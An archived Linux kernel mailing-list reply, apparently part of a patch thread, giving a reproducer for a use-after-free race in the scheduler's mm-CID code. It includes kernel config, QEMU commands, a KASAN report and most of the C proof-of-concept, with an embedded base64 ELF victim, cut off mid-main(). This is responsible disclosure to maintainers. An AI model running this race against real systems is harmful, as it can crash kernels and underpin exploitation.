Received: from kanga.kvack.org (kanga.kvack.org [205.233.56.17])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id CF7EA606A326
	for <linux-mm@archiver.kernel.org>; Tue, 10 Nov 2026 18:38:50 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=N0RmoVtL
Received: by kanga.kvack.org (Postfix)
	id D8EC26B05C0; Tue, 10 Nov 2026 13:38:49 -0500 (EST)
Received: by kanga.kvack.org (Postfix, from userid 40)
	id D66116B05C1; Tue, 10 Nov 2026 13:38:49 -0500 (EST)
X-Delivered-To: int-list-linux-mm@kvack.org
Received: by kanga.kvack.org (Postfix, from userid 63042)
	id C55246B05C2; Tue, 10 Nov 2026 13:38:49 -0500 (EST)
X-Delivered-To: linux-mm@kvack.org
Received: from relay.hostedemail.com (smtprelay0016.hostedemail.com [216.40.44.16])
	by kanga.kvack.org (Postfix) with ESMTP id 977D26B05C0
	for <linux-mm@kvack.org>; Tue, 10 Nov 2026 13:38:49 -0500 (EST)
Received: from smtpin30.hostedemail.com (lb01a-stub [10.200.18.249])
	by unirelay09.hostedemail.com (Postfix) with ESMTP id 184A780A16
	for <linux-mm@kvack.org>; Tue, 10 Nov 2026 18:38:49 +0000 (UTC)
X-FDA: 85420070778.30.4515982
Received: from mail-pf1-f176.google.com (mail-pf1-f176.google.com [209.85.210.176])
	by imf01.hostedemail.com (Postfix) with ESMTP id 3C8B340002
	for <linux-mm@kvack.org>; Tue, 10 Nov 2026 18:38:47 +0000 (UTC)
Authentication-Results: imf01.hostedemail.com;
	dkim=pass header.d=gmail.com header.s=20260707 header.b=N0RmoVtL;
	spf=pass (imf01.hostedemail.com: domain of bestswngs@gmail.com designates 209.85.210.176 as permitted sender) smtp.mailfrom=bestswngs@gmail.com;
	dmarc=pass (policy=none) header.from=gmail.com
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
	s=arc-20220608; t=1794335927;
	h=from:from:sender:reply-to:subject:subject:date:date:
	 message-id:message-id:to:to:cc:cc:mime-version:mime-version:
	 content-type:content-transfer-encoding:content-transfer-encoding:
	 in-reply-to:in-reply-to:references:references:dkim-signature;
	bh=KPARybczsQ4TwiwoQgAZSJyw5+1uXswc+09aq1THBoA=;
	b=sl4FnyvPrQ+lTh/P92DMiyho9NWoR1TVOSEnjo24nUGcxGK0X05fuOrUjnrsZMIr0pKXbN
	gR68Q5zr+gTZvWcb3HJs8b3QlOKpcpGQBp5kts5LlJ2Fho0oZ8z3kbGKlz/yhaI1jhT/WS
	4mwlpSBFQcuQCpbj4bSiisoLjZUeWbQ=
ARC-Seal: i=1; a=rsa-sha256; d=hostedemail.com; s=arc-20220608; cv=none;
	t=1794335927;
	b=AO38c233uITI3JKaalDQgdQa+DzmuyoT1v9V1B891cG8vmoRVlydfbe4bbCbPspsaUjhwA
	IWEoSXzlR+NnGpNDjOUd9yTtGjoQJRvXBC1ZllqG1jnhWErOQ+ifpe1ocWVMcyuQR/8w72
	2UQHz0mhPQiNNsIfTQ5SNwxHJXFZuSA=
ARC-Authentication-Results: i=1;
	imf01.hostedemail.com;
	dkim=pass header.d=gmail.com header.s=20260707 header.b=N0RmoVtL;
	spf=pass (imf01.hostedemail.com: domain of bestswngs@gmail.com designates 209.85.210.176 as permitted sender) smtp.mailfrom=bestswngs@gmail.com;
	dmarc=pass (policy=none) header.from=gmail.com
Received: by mail-pf1-f176.google.com with SMTP id d2e1a72fcca58-8b2382bf051so1426002b3a.3
        for <linux-mm@kvack.org>; Tue, 10 Nov 2026 10:38:46 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20260707; t=1794335926; x=1794940726; darn=kvack.org;
        h=content-transfer-encoding:mime-version:references:in-reply-to
         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=KPARybczsQ4TwiwoQgAZSJyw5+1uXswc+09aq1THBoA=;
        b=N0RmoVtLVG+bSxFsfHJiZKIupznUazu2c4hQcqOEobWE3JOSlUQyQrhUke6R8p32q+
         MhfuE/FKig3zrWH4n3mU+rpWqcDZKAo2zsqApGdMbac3yD8+iC45B0phRQEHOo5+fyLP
         Oq6CM0fKdCMdDB/wwyGdFxRsr1JQldQvUn0lR5jbn/QAoXtiypsdwGzsrNnau1aG/N2Q
         aczRMFkejbqv+5fhDSBp7edJXGF6gx9kY+oTofRCEOV95d9pn5oNjdpf5HZ6HgMtOxa6
         PBVVn+U/akqSkmegZbC7mVJIfEH+Wtds0NLBMZTvLgTrvGqG4XKAJV+xTbzikWLOYvNO
         x+6Q==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1794335926; x=1794940726;
        h=content-transfer-encoding:mime-version:references:in-reply-to
         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to:content-type;
        bh=KPARybczsQ4TwiwoQgAZSJyw5+1uXswc+09aq1THBoA=;
        b=YTv0g28cz9u5Srj32k/ynpczQp5AZEavDvIpnPgddgvOQiagptaAgUcF24IQI+RQiO
         bEQuYBqVgvSTLSYhDVb2ZwBuyYopEEXiMF7ThsWqWoZEYSzk55R1KP63G7QYhXPP7h8w
         sXv3OlsCbPIUKMAoPwmEElidzXEn2Vo5DdfDbW2Lc4eWJxqic08Zw3L1a0GxZ+f4VP/1
         WPPRXg8hov+CwOH2HSJVK2ENgmx5mWJtPco0KJ2mgKDyKN31ez+ta7mZu+a97bn/NxRg
         eDs9kCTIeMQUv819MppKrQsGtJsLJSVV4kt3sXgo/MKBxAq2yvfobjCqBzQ17xifXkmi
         tU8A==
X-Forwarded-Encrypted: i=1; AL+hErE7GH2uvR+EL+HuVqZMmkhFaBQrCvv3ohkE0jwzr6ro74ADz30kt3iK40sGfQU/3pdwHuaoeIH2jg==@kvack.org
X-Gm-Message-State: APuU4Z/B/pFdPI8cIRLEJvlB65V2sf1VSLR65UgO/XdN9/DQLT+XUrBl
	/0rBK89nQu6Mqf282oMBgbW+Gz0SBqGINNUIr7KpAMawnRa2YbRH2g6k
X-Gm-Gg: AYBFou1Yf20xsbPNHeueN1tAdV67TZYmxBklqbByoG+P9R/iSNjHVD0TM4Q2Gr2FwcW
	45lfeZ11DsXiQv1YQAys6pw39/dFgoxAKWvJ7sMASxi0g9METJhghx61b5ZEq7WW+YzCi4jZWp7
	3PobM5IhiIC9IwBwfq9xvxaB5xSckXcCIsi1BOzT1Rnkv9/nJpqApRESyA6M4vWHF3P7+GJ0K03
	TvwSGK/Y1Ksn84cFHAL8aELi3ljxwYhHK7U7eSAiZRTlaWYikb5vP2/Wrlv5Rmp3fE3HrsSxRsn
	axUhVfzlj6vbJn1sK/wHkDqEhE6PDJZsPEz4xXsBZFXfCIPbjvL64e9tPLm+BEuCQxf8RQUTMT+
	1ALWClC9FNONnUf9alsjaouZhJqDcKBYrkFL72wd59+ddvQPi7HtUri0XIhwPjB8dpXboLcdsyu
	j7LSAl+4iOJzzMEYJSucRRmDQ+poLbovaltjy/oQwvc51VM1twH0UHsGQlN1g71wdivlYATWCUi
	4wt2koRX+IKyTUHwD2NVmJbXJ2m9/fZRbat12JIGdjmBFNwVIxNVU0ULzwBC8IOlbWGzTKWJ1op
	njWmqU4Wk/1M6pWAWmcnAnz3D5QpLBdO9oIhTodbrB8ZROVUXQclMOeE8U4DceRxJ8F1PZL2RZj
	NmA==
X-Received: by 2002:a05:6a00:950b:b0:8b5:c588:ca49 with SMTP id d2e1a72fcca58-8ba8764699fmr3637501b3a.46.1794335925819;
        Tue, 10 Nov 2026 10:38:45 -0800 (PST)
Received: from Terra.tail0ac356.ts.net ([198.176.50.208])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-8baaa963bd1sm1257490b3a.29.2026.11.10.10.38.33
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 10 Nov 2026 10:38:45 -0800 (PST)
From: Weiming Shi <bestswngs@gmail.com>
To: Kees Cook <kees@kernel.org>,
	Alexander Viro <viro@zeniv.linux.org.uk>,
	Christian Brauner <brauner@kernel.org>,
	Jan Kara <jack@suse.cz>,
	Ingo Molnar <mingo@redhat.com>,
	Peter Zijlstra <peterz@infradead.org>,
	Juri Lelli <juri.lelli@redhat.com>,
	Vincent Guittot <vincent.guittot@linaro.org>,
	Dietmar Eggemann <dietmar.eggemann@arm.com>,
	Steven Rostedt <rostedt@goodmis.org>,
	Ben Segall <bsegall@google.com>,
	Mel Gorman <mgorman@suse.de>,
	Valentin Schneider <vschneid@redhat.com>,
	K Prateek Nayak <kprateek.nayak@amd.com>
Cc: Mathieu Desnoyers <mathieu.desnoyers@efficios.com>,
	linux-mm@kvack.org,
	linux-fsdevel@vger.kernel.org,
	linux-kernel@vger.kernel.org,
	Xiang Mei <xmei5@asu.edu>
Subject: Re: [PATCH v3] sched/mmcid: Synchronize MM teardown with affinity updates
Date: Tue, 10 Nov 2026 10:38:09 -0800
Message-ID: <20261110183809.3308868-2-bestswngs@gmail.com>
X-Mailer: git-send-email 2.56.0
In-Reply-To: <20261110183809.3308868-1-bestswngs@gmail.com>
References: <20261110183809.3308868-1-bestswngs@gmail.com>
X-Archived-By: <archiver.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-Spam-Status: No, score=-2.3 required=3.0 tests=BAYES_00,DKIM_SIGNED,
	DKIM_VALID,DKIM_VALID_AU,FREEMAIL_FORGED_FROMDOMAIN,FREEMAIL_FROM,
	FROM_LOCAL_NOVOWEL,HEADER_FROM_DIFFERENT_DOMAINS,LOTS_OF_MONEY,
	MAILING_LIST_MULTI,SPF_HELO_PASS,SPF_PASS,USER_AGENT_GIT autolearn=no
	autolearn_force=no version=4.0.1
X-Rspamd-Server: rspam09
X-Stat-Signature: izeyn9whan7ocjek7cimb3mjfqeuqacm
X-Rspamd-Queue-Id: 3C8B340002
X-Rspam-User: 
X-HE-Tag: 1794335927-619132
X-HE-Meta: U2FsdGVkX1+iQylFFfWj30972SO/wPvm8zq61pZwUYfv2wm23oZyihF5G4zjLUp5SLi7LPQVR3oMl0vdqo6JONXwQeb4HasKXAXgmrsQu/coQsFcVwne+QqLSXK/adAZ0HLkEG6mEKEP99P09SOIfw/zvEUaywxTOY+lGl21whlWuIpk0PhLbuPXrL4+RE55T62sl2IZR110h8syZP8DwD/p1RkRo+F5mdWIBN6dryvArYDgUPRLZFIJ+s0ZhEjguxA94Zg3M0E8QSMYDDTY6hv6NGpesbbRAhJjiNLuyT2tsSKW6KMpu+Q6o+C412jVpjjtA2x0ISzT7pUyN524H9L6+lHVfxaaWMyYilXPpvVU9UGO9vceRc/zBHhL4Hie1h8JqT1L1pfp1AzqQ3q3H8qV547ql4IRGP62duUUHFRb/03HMi3KTq5MLOWXyYW7Bj57P/nmoLG4Q2Cwo3c9NwxEypIyg8ou1nV4YqeqbBopOAzbfzbYw9X/0gW0T09wiSOVwu1vsBibRQ3tn3a5x4WtT08HOcWNdIRearD69RtU8+OlYTzQD1HaYgyAK1DlCftrl3iVAsaBAGCivO5UexUobsM3Ds1/RPTUXpGOrcPyaKFnZ3CS/bfz4XwWL/gGnFiuComRlbSgBYYq4Su3mibyM5JynvBRi2Bx7evXYQduTNDywy9c7OoZPLGrbh5k8P4fiA7a1WfmZZms6wbUOU47NFo3XzS1zK4Bn88rWbCpQUpmFqH4H5J8EkRwgMYnQWouekrXFE8FuEGy5XjEc2w1htuo2wH6VlGla11wdHn9GRjEpdBX37SO0YgetD2bUIK+8LGCruqyNjh0b7cOdt8PrSqjOWgzMz+L4K2SMu9rUkTB+rNdjUdgluBiync1zqqqIydmLl/eHeV2yFhwQETABvrUsaVq4ZTuBn90hRwqTwvCRNIZscGknNU8Xa9a1Mrub/6oUi8ZNOZZUbP
 dkcSo0S1
 g2cPjfOrOFRZqUrGVsOFsBbySb5yaHvbjdsoA7fq4zD8i8EWpq6a3hSLPQJBKJHfia1XHRh9b8TbVwT1YHPj0tkwJ3OKaYQJ+v/Kkd/0PCTVwCIL8J9JJLI7WrnTSKJsQ7EqCJ2uwMaO94V8AIrW8spD3A9+C5mt1QLtJ0rBpX3shGjSV/fbm3yo2IPDghjXJ2tVnEtVZw5pbuh/QfGLpcqEsrg5bSuAEyzdH+lbb8pY7GOW1kAg6QdBIjMax/bYP/j3qhQivJYXh1wseXVEVg/TY28bSALAR/sXRsV88jqkY8ALqX6y82MbXIMo7OfgA5skdXj5o9I2fAO6A7YT8Ns/Q/w77kX+/11+pNQZtaN7Qk0DNT62y0FllvNkcAtDZfQibddhHvvkG3ntRWcwRg7y8n5WA8nkFbS+uvXL6ssrN4Y6/lltr1g+GTmLE7oJe3vtr
Sender: owner-linux-mm@kvack.org
Precedence: bulk
X-Loop: owner-majordomo@kvack.org
List-ID: <linux-mm.kvack.org>
List-Subscribe: <mailto:majordomo@kvack.org>
X-Spam-Checker-Version: SpamAssassin 4.0.1 (2024-03-26) on
	aws-us-west-2-korg-listserv-alma10-1

Hi,

Here is a standalone reproducer for the p->mm lifetime race.

The tested kernel was commit 05441d697f7f9a927264f4058cbbc6a03dfcac9d
with:

```
CONFIG_SMP=y
CONFIG_EXPERT=y
# CONFIG_FUTEX is not set
CONFIG_RSEQ=y
CONFIG_SCHED_MM_CID=y
CONFIG_KASAN=y
CONFIG_KASAN_GENERIC=y
CONFIG_KASAN_INLINE=y
CONFIG_DEBUG_INFO=y
```

KASAN and DEBUG_INFO produce and decode the report. The vulnerable path
requires CONFIG_SCHED_MM_CID=y. This exec manifestation also requires
CONFIG_FUTEX=n because futex_exec_done() otherwise serializes old-MM teardown
with the p->pi_lock held by the affinity updater.

Dependencies and scheduling setup:

- x86-64 Linux guest with at least four online CPUs;
- gcc and glibc in the guest to build the PoC;
- sched_setaffinity(), memfd_create(), and execveat() available;
- eight guest vCPUs scheduled on four host CPUs for the tested 2:1 overcommit;
- UID/GID 65534 for the tested run.

Host command:

```
taskset -c 0-3 qemu-system-x86_64 \
    -accel kvm -machine q35 -cpu max -m 8G -smp 8 \
    -kernel bzImage -initrd initramfs.cpio.gz \
    -append "console=ttyS0 rdinit=/init nokaslr panic_on_warn=1 panic=-1" \
    -nographic -no-reboot
```

Build and run inside the guest:

```
gcc -O3 -Wall -Wextra -o poc poc.c
./poc 180
```

The reproducer works as follows:

1. It decodes an embedded 848-byte ET_EXEC image into a memfd.
2. The victim initially pins itself to the penultimate guest CPU. The setters
   then alternate its affinity between that CPU alone and the last two guest
   CPUs while it repeatedly executes the memfd with execveat(AT_EMPTY_PATH).
3. Up to six same-UID setter processes run on the other CPUs and alternate the
   victim between one- and two-CPU affinity masks.
4. A 31-us periodic userspace SIGALRM provides interrupt pressure.
5. Host CFS overcommit can deschedule a setter after it loads the
   victim's old p->mm. The victim can then complete setup_new_exec() and free
   that old mm before the setter reaches mm_update_cpus_allowed().

The PoC counts syscall attempts, successful affinity updates, errors, and
completed victim execs separately. Every ten-second window must contain both
a successful affinity update and victim exec progress. It checks for an early
victim or setter exit, and a clean result requires successful child statuses.

This is a stochastic race. The progress-checking version reported the UAF
after about 52.60 seconds. The last completed ten-second window before the
crash recorded 2,096,128 successful affinity updates, zero errors, and 18,975
completed execs:

```
BUG: KASAN: slab-use-after-free in set_cpus_allowed_common
Read of size 4 at addr ffff888123155e4c by task poc/5132
CPU: 4 UID: 65534 PID: 5132 Comm: poc

Call Trace:
 set_cpus_allowed_common             kernel/sched/core.c:10835
 set_cpus_allowed_fair               kernel/sched/fair.c:10046
 __set_cpus_allowed_ptr_locked       kernel/sched/core.c:3224
 __set_cpus_allowed_ptr              kernel/sched/core.c:3258
 __sched_setaffinity                 kernel/sched/syscalls.c:1161
 sched_setaffinity                   kernel/sched/syscalls.c:1239
 __x64_sys_sched_setaffinity         kernel/sched/syscalls.c:1275
 do_syscall_64                       arch/x86/entry/syscall_64.c:84
 entry_SYSCALL_64_after_hwframe      arch/x86/entry/entry_64.S:121

Freed by task 5127:
 kmem_cache_free                     mm/slub.c:6757
 __mmput                             kernel/fork.c:1204
 mmput                               kernel/fork.c:1215
 setup_new_exec                      fs/exec.c:1395
 load_elf_binary                     fs/binfmt_elf.c:1024
 bprm_execve                         fs/exec.c:1865
 do_execveat_common.isra.0           fs/exec.c:1963
 __x64_sys_execveat                  fs/exec.c:2047
 do_syscall_64                       arch/x86/entry/syscall_64.c:84
 entry_SYSCALL_64_after_hwframe      arch/x86/entry/entry_64.S:121
```

Complete PoC:

```c
/*
 * Standalone reproducer for the sched/mmcid p->mm UAF.
 *
 * Build: gcc -O3 -o poc poc.c
 * Run:   taskset -c 0-3 qemu-system-x86_64 ... -smp 8 ...
 * Guest: ./poc [seconds]
 *
 * The tiny self-exec victim is embedded below and executed from memfd.  The
 * tested VM used CONFIG_SCHED_MM_CID=y, CONFIG_FUTEX=n and 2:1 vCPU
 * overcommit (8 vCPUs on 4 host CPUs).
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/eventfd.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define DEFAULT_RUNTIME 180
#define MAX_SETTERS 6
#define READY_FD 3
#define VICTIM_FD 4
#define VICTIM_SIZE 848

/* 848-byte ET_EXEC produced from victim_min_execfd.S + victim_min.ld. */
static const char victim_b64[] =
"f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAsABAAAAAAABAAAAAAAAAABACAAAAAAAAAAAAAEAAOAAC"
"AEAABQAEAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAOAEAAAAAAAA4AQAAAAAAAAAQ"
"AAAAAAAAUeV0ZAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAA"
"AAAAAABJieS4AQAAAL8DAAAASI01VAAAALoIAAAADwVIg/gIdTlMiedIgecAAOD/vgAAQAC4CwAA"
"AA8FuEIBAAC/BAAAAEiNNSgAAABIjRUpAAAARTHSQbgAEAAADwW4PAAAAL9/AAAADwX0kAEAAAAA"
"AAAAAAAAAAAAAAAgAUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA"
"8f8AAAAAAAAAAAAAAAAAAAAACgAAAAAAAQAYAUAAAAAAAAAAAAAAAAAADgAAAAAAAQAgAUAAAAAA"
"AAAAAAAAAAAAFAAAAAAAAQAoAUAAAAAAAAAAAAAAAAAAGQAAABIAAQCwAEAAAAAAAGcAAAAAAAAA"
"AHZpY3RpbS5vAG9uZQBlbXB0eQBhcmd2AF9zdGFydAAALnN5bXRhYgAuc3RydGFiAC5zaHN0cnRh"
"YgAuaW1hZ2UAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAABAAAABwAAAAAAAACwAEAAAAAAALAAAAAAAAAAiAAA"
"AAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAA4AQAA"
"AAAAAJAAAAAAAAAAAwAAAAUAAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAA"
"AAAAyAEAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAADAAAAAAAAAAAA"
"AAAAAAAAAAAAAOgBAAAAAAAAIgAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=";

struct setter_stats {
	volatile unsigned long long attempts;
	volatile unsigned long long successes;
	volatile unsigned long long errors;
};

struct shared_state {
	struct setter_stats setters[MAX_SETTERS];
};

static int b64_value(unsigned char c)
{
	if (c >= 'A' && c <= 'Z')
		return c - 'A';
	if (c >= 'a' && c <= 'z')
		return c - 'a' + 26;
	if (c >= '0' && c <= '9')
		return c - '0' + 52;
	if (c == '+')
		return 62;
	if (c == '/')
		return 63;
	return -1;
}

static int install_victim(void)
{
	unsigned char out[VICTIM_SIZE];
	size_t i, n = 0;
	unsigned int acc = 0, bits = 0;
	int fd;

	for (i = 0; victim_b64[i] && victim_b64[i] != '='; i++) {
		int v = b64_value((unsigned char)victim_b64[i]);

		if (v < 0)
			continue;
		acc = (acc << 6) | (unsigned int)v;
		bits += 6;
		if (bits >= 8) {
			bits -= 8;
			if (n == sizeof(out)) {
				errno = EOVERFLOW;
				return -1;
			}
			out[n++] = (unsigned char)(acc >> bits);
			acc &= (1U << bits) - 1;
		}
	}
	if (n != sizeof(out)) {
		errno = EINVAL;
		return -1;
	}
	fd = syscall(SYS_memfd_create, "sched-mmcid-victim", 0);
	if (fd < 0)
		return -1;
	if (fd != VICTIM_FD) {
		if (dup2(fd, VICTIM_FD) < 0) {
			close(fd);
			return -1;
		}
		close(fd);
		fd = VICTIM_FD;
	}
	if (write(fd, out, n) != (ssize_t)n || fchmod(fd, 0700))
		return -1;
	return 0;
}

static int install_exec_counter(void)
{
	int fd = eventfd(0, EFD_NONBLOCK);

	if (fd < 0)
		return -1;
	if (fd != READY_FD) {
		if (dup2(fd, READY_FD) < 0) {
			close(fd);
			return -1;
		}
		close(fd);
	}
	return 0;
}

static void pin_self(int cpu)
{
	cpu_set_t mask;

	CPU_ZERO(&mask);
	CPU_SET(cpu, &mask);
	if (sched_setaffinity(0, sizeof(mask), &mask)) {
		fprintf(stderr, "pin cpu%d: %s\n", cpu, strerror(errno));
		_exit(2);
	}
}

static void alarm_handler(int sig)
{
	(void)sig;
}

static void enable_irq_pressure(void)
{
	struct sigaction sa = { .sa_handler = alarm_handler };
	struct itimerval timer = {
		.it_interval = { .tv_sec = 0, .tv_usec = 31 },
		.it_value = { .tv_sec = 0, .tv_usec = 31 },
	};

	sigemptyset(&sa.sa_mask);
	sa.sa_flags = SA_RESTART;
	if (sigaction(SIGALRM, &sa, NULL) ||
	    setitimer(ITIMER_REAL, &timer, NULL))
		_exit(3);
}

static int drain_exec_counter(unsigned long long *total)
{
	uint64_t value;

	for (;;) {
		ssize_t ret = read(READY_FD, &value, sizeof(value));

		if (ret == sizeof(value)) {
			*total += value;
			continue;
		}
		if (ret < 0 && errno == EINTR)
			continue;
		if (ret < 0 && errno == EAGAIN)
			return 0;
		return -1;
	}
}

static int wait_for_first_exec(pid_t victim, unsigned long long *execs)
{
	struct pollfd pfd = { .fd = READY_FD, .events = POLLIN };
	int status, ret;

	do {
		ret = poll(&pfd, 1, 5000);
	} while (ret < 0 && errno == EINTR);
	if (ret != 1 || !(pfd.revents & POLLIN) ||
	    drain_exec_counter(execs) || !*execs)
		return -1;
	ret = waitpid(victim, &status, WNOHANG);
	if (ret == victim) {
		errno = ECHILD;
		return -1;
	}
	return ret < 0 ? -1 : 0;
}

static void publish_stats(struct setter_stats *stats,
			  unsigned long long attempts,
			  unsigned long long successes,
			  unsigned long long errors)
{
	__atomic_store_n(&stats->attempts, attempts, __ATOMIC_RELAXED);
	__atomic_store_n(&stats->successes, successes, __ATOMIC_RELAXED);
	__atomic_store_n(&stats->errors, errors, __ATOMIC_RELAXED);
}

static void run_setter(pid_t victim, int cpu, int victim_a, int victim_b,
		       int index, time_t deadline, struct shared_state *state)
{
	cpu_set_t one, two;
	unsigned long long attempts = 0, successes = 0, errors = 0;

	prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
	pin_self(cpu);
	enable_irq_pressure();
	CPU_ZERO(&one);
	CPU_SET(victim_a, &one);
	CPU_ZERO(&two);
	CPU_SET(victim_a, &two);
	CPU_SET(victim_b, &two);
	while (time(NULL) < deadline) {
		if (!syscall(SYS_sched_setaffinity, victim, sizeof(one), &one))
			successes++;
		else
			errors++;
		attempts++;
		if (!syscall(SYS_sched_setaffinity, victim, sizeof(two), &two))
			successes++;
		else
			errors++;
		attempts++;
		if (!(attempts & 0x3ff))
			publish_stats(&state->setters[index], attempts,
				      successes, errors);
	}
	publish_stats(&state->setters[index], attempts, successes, errors);
	_exit(0);
}

static void load_totals(struct shared_state *state, int nset,
			unsigned long long *attempts,
			unsigned long long *successes,
			unsigned long long *errors)
{
	int i;

	*attempts = *successes = *errors = 0;
	for (i = 0; i < nset; i++) {
		*attempts += __atomic_load_n(&state->setters[i].attempts,
					     __ATOMIC_RELAXED);
		*successes += __atomic_load_n(&state->setters[i].successes,
					      __ATOMIC_RELAXED);
		*errors += __atomic_load_n(&state->setters[i].errors,
					   __ATOMIC_RELAXED);
	}
}

static int wait_child(pid_t pid, int *status)
{
	pid_t ret;

	do {
		ret = waitpid(pid, status, 0);
	} while (ret < 0 && errno == EINTR);
	return ret == pid ? 0 : -1;
}

int main(int argc, char **argv)
{
	struct shared_state *state;
	pid_t victim, setters[MAX_SETTERS];
	time_t deadline;
	unsigned long long attempts = 0, successes = 0, errors = 0;
	unsigned long long execs = 0, previous_execs, previous_successes = 0;
	int cpus, runtime, victim_a, victim_b, nset, i, status;
	int spawned = 0, failed = 0;

	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
	cpus = (int)sysconf(_SC_NPROCESSORS_ONLN);
	if (cpus < 4) {
		fprintf(stderr, "need at least four online CPUs\n");
		return 1;
	}
	runtime = argc > 1 ? atoi(argv[1]) : DEFAULT_RUNTIME;
	if (runtime <= 0)
		runtime = DEFAULT_RUNTIME;
	victim_a = cpus - 2;
	victim_b = cpus - 1;
	nset = victim_a < MAX_SETTERS ? victim_a : MAX_SETTERS;
	state = mmap(NULL, sizeof(*state), PROT_READ | PROT_WRITE,
		     MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (state == MAP_FAILED)
		return 1;
	for (i = 0; i < MAX_SETTERS; i++)
		setters[i] = -1;
	if (install_exec_counter() || install_victim()) {
		perror("install victim");
		return 1;
	}

	victim = fork();
	if (!victim) {
		cpu_set_t pinned;
		char *const av[] = { "victim", NULL };
		char *const ev[] = { NULL };

		prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
		CPU_ZERO(&pinned);
		CPU_SET(victim_a, &pinned);
		if (sched_setaffinity(0, sizeof(pinned), &pinned))
			_exit(4);
		syscall(SYS_execveat, VICTIM_FD, "", av, ev, AT_EMPTY_PATH);
		_exit(127);
	}
	if (victim < 0)
		return 1;
	if (wait_for_first_exec(victim, &execs)) {
		perror("victim did not begin exec loop");
		failed = 1;
		goto cleanup;
	}
	deadline = time(NULL) + runtime;
	printf("[*] standalone minimal-exec race: runtime=%ds setters=%d\n",
	       runtime, nset);
	printf("[*] victim starts on cpu%d; setters alternate {%d} and {%d,%d}\n",
	       victim_a, victim_a, victim_a, victim_b);
	for (i = 0; i < nset; i++) {
		setters[i] = fork();
		if (!setters[i])
			run_setter(victim, i, victim_a, victim_b, i,
				   deadline, state);
		if (setters[i] < 0) {
			perror("fork setter");
			failed = 1;
			goto cleanup;
		}
		spawned++;
	}
	previous_execs = execs;
	while (time(NULL) < deadline) {
		struct timespec delay;
		time_t remaining = deadline - time(NULL);
		pid_t ret;

		ret = waitpid(victim, &status, WNOHANG);
		if (ret == victim) {
			fprintf(stderr, "victim exited early: status=0x%x\n", status);
			victim = -1;
			failed = 1;
			goto cleanup;
		}
		if (ret < 0) {
			perror("waitpid victim");
			failed = 1;
			goto cleanup;
		}
		for (i = 0; i < spawned; i++) {
			if (setters[i] < 0)
				continue;
			ret = waitpid(setters[i], &status, WNOHANG);
			if (ret == setters[i]) {
				setters[i] = -1;
				if (time(NULL) < deadline || !WIFEXITED(status) ||
				    WEXITSTATUS(status)) {
					fprintf(stderr,
						"setter %d exited early: status=0x%x\n",
						i, status);
					failed = 1;
					goto cleanup;
				}
			} else if (ret < 0) {
				perror("waitpid setter");
				failed = 1;
				goto cleanup;
			}
		}
		if (remaining <= 0)
			break;
		delay.tv_sec = remaining > 10 ? 10 : remaining;
		delay.tv_nsec = 0;
		while (nanosleep(&delay, &delay) && errno == EINTR)
			;
		if (drain_exec_counter(&execs)) {
			perror("read exec counter");
			failed = 1;
			goto cleanup;
		}
		ret = waitpid(victim, &status, WNOHANG);
		if (ret == victim) {
			fprintf(stderr, "victim exited early: status=0x%x\n", status);
			victim = -1;
			failed = 1;
			goto cleanup;
		}
		if (ret < 0) {
			perror("waitpid victim");
			failed = 1;
			goto cleanup;
		}
		load_totals(state, nset, &attempts, &successes, &errors);
		if (execs == previous_execs) {
			fprintf(stderr, "victim made no exec progress in window\n");
			failed = 1;
			goto cleanup;
		}
		if (successes == previous_successes) {
			fprintf(stderr,
				"setters made no successful affinity progress in window\n");
			failed = 1;
			goto cleanup;
		}
		printf("[*] progress: affinity_success=%llu attempts=%llu "
		       "errors=%llu execs=%llu\n",
		       successes, attempts, errors, execs);
		previous_execs = execs;
		previous_successes = successes;
	}
	for (i = 0; i < spawned; i++) {
		if (setters[i] < 0)
			continue;
		if (wait_child(setters[i], &status) || !WIFEXITED(status) ||
		    WEXITSTATUS(status)) {
			fprintf(stderr, "setter %d failed: status=0x%x\n", i, status);
			failed = 1;
		}
		setters[i] = -1;
	}
	load_totals(state, nset, &attempts, &successes, &errors);
	if (!attempts || !successes || attempts != successes + errors) {
		fprintf(stderr, "invalid affinity totals\n");
		failed = 1;
	}
